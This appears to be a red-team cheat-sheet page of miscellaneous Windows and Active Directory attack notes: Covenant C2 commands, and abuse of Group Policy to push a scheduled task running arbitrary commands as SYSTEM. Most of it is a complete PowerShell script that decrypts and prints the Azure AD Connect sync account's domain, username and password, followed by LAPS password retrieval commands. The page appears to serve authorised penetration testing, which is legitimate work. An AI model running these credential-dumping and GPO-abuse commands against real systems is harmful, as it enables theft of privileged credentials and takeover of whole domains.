# Misc

### Session IDs

On Windows processes run with session id 0 or 1.  Session ID 1 means the process was started by a legitimate user, while 0 is used for various processes spawned by the system. Sometimes having just a 0 session is a problem, in these cases we can just inject into a process that has 1.

### Covenant Misc

Change Delay/Sleep on existing grunt:

```text
Set Delay <seconds>
sleep <seconds>
```

Execute .Net directly with SharpShell:

```text
SharpShell return Shell.PowerShellExecute("whoami");
```

### GPO Abuse

Use [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) to modify/add GPOs. Covenant example:

```text
Assembly /assemblyname:"SharpGPOAbuse" /parameters:"--AddComputerTask --TaskName \"<taskname>\" --Author NT AUTHORITY\SYSTEM --Command \"cmd.exe\" --Arguments \"/c <cmd>\" --GPOName \"<gponame>\""
```

### Azure AD Connect

The credentials for the hash synchronisation account are stored locally in a database. They can be recovered with [ADConnectDump ](https://github.com/fox-it/adconnectdump)or directly via this script by [xpn](https://blog.xpnsec.com/azuread-connect-for-redteam/). You might need to modify the first line if its stored on a SQL Server instead of locally.

```text
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

### LAPS

If you are on a box with LAPS enabled and have the correct permissions you can get the password:

```text
 Get-AdmPwdPassword -ComputerName <>
```

PowerView can do it too:

```text
PowerShell Get-AdmPwdPassword -ComputerName <> | fl
```

### Exfiltrating Data

* Don't egress data without consent, there are dummy solutions for this: [https://github.com/FortyNorthSecurity/Egress-Assess](https://github.com/FortyNorthSecurity/Egress-Assess)

